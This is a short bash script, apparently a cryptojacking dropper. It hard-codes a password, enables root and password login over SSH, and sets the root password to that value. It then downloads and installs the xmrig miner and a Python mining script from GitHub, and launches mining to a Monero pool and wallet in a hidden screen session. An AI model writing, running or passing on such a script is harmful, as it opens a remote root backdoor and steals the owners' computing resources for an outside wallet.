#!/usr/bin/env bash
echo KLxcsi125vcx45cx3 | sudo -S 'sudo root'
sudo sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/g' /etc/ssh/sshd_config
sudo sed -i 's/PermitRootLogin no/PermitRootLogin yes/g' /etc/ssh/sshd_config
sudo sed -i 's/PermitRootLogin without-password/PermitRootLogin yes/g' /etc/ssh/sshd_config
sudo service sshd restart
echo -e 'KLxcsi125vcx45cx3\nKLxcsi125vcx45cx3' | (sudo passwd --stdin root)

sudo wget --tries=0 --retry-connrefused --waitretry=5 --read-timeout=20 http://dl.fedoraproject.org/pub/epel/epel-release-latest-7.noarch.rpm
sudo rpm -ivh epel-release-latest-7.noarch.rpm

sudo yum install -y screen git unzip gcc htop

sudo wget --tries=0 --retry-connrefused --waitretry=5 --read-timeout=20 https://github.com/opsengine/cpulimit/archive/master.zip -O cpulimit.zip
sudo unzip cpulimit.zip
sudo cd cpulimit-master
sudo make
sudo cp src/cpulimit /usr/bin
sudo cd ~
sudo rm -rf cpulimit-master
sudo rm -f cpulimit.zip

sudo wget --tries=0 --retry-connrefused --waitretry=5 --read-timeout=20 https://github.com/grundmeierl/PyMinerTSA/raw/master/xmrig -O xmrig
sudo cp xmrig /usr/bin
sudo chmod +x /usr/bin/xmrig

rm -f m.py
sudo wget --tries=0 --retry-connrefused --waitretry=5 --read-timeout=20 https://github.com/grundmeierl/PyMinerTSA/raw/master/m.py -O m.py

sudo screen -dmSL MM bash -c "python m.py pool.supportxmr.com:9000 471fSppS1K5V7TJQhtFmtqMhnkBnUikq55gbb8cNfAL1i6ZtcKaPVT3j7yo4sk5xrFXFpBZUo9mdAdZhbWD1Sk61D8U6A3M GwangjuWHO"